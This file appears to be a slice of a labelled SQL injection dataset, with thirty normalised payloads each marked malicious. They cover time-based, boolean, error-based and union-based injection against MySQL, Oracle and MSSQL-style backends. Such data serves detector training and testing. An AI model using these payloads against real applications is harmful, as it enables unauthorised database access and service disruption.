row_index,payload_norm,label,sqli_type_hint
5910,"1%"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1,
5911,-7164%' or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and '%' = ',1,
5912,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( 9069 = 9069,1,
5913,"1%"" ) ) ) union all select null,null,null,null,null,null,null--",1,
5914,"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",1,
5915,"1 ) where 2720 = 2720 and elt ( 4249 = 4249,7259 ) --",1,
5916,"-5924' where 5415 = 5415 union all select 5415,5415,5415,5415,5415,5415#",1,
5917,select 'qqpjq'|| ( select ( case when ( 2933 = 2933 ) then 1 else 0 end ) ) ||'qzvzq',1,
5918,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( ""ymss"" = ""ymss",1,
5919,"1'+ ( select 'qpxk' where 7139 = 7139 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) +'",1,
5920,"-8538"" or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",1,
5921,"1"" and ( select * from ( select ( sleep ( 5 ) ) ) fzno )",1,
5922,"1'+ ( select 'fxhh' where 2571 = 2571 union all select null,null,null,null,null,null,null--",1,
5923,"1%' or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
5924,select ( case when ( 7990 = 7627 ) then 7990 else 1/ ( select 0 ) end ) --,1,
5925,"-1766"" ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""ydzq"" like ""ydzq",1,
5926,"1%"" ) ) and 1083 = 6202",1,
5927,"-5731"" union all select 3083,3083,3083#",1,
5928,"1' in boolean mode ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) #",1,
5929,"1%"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ""%"" = """,1,
5930,1' where 9816 = 9816 and 7533 = 7533--,1,
5931,"1' ) where 3450 = 3450 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
5932,1' ) and sleep ( 5 ) #,1,
5933,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'cbaj' = 'cbaj,1,
5934,"-8040"" ) ) ) or make_set ( 3916 = 6787,6787 ) and ( ( ( ""laar"" like ""laar",1,
5935,"-9932"" union all select 4049,4049,4049--",1,
5936,"1' ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
5937,"1' and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
5938,"1 ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",1,
5939,"1' ) as kbja where 4275 = 4275 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,
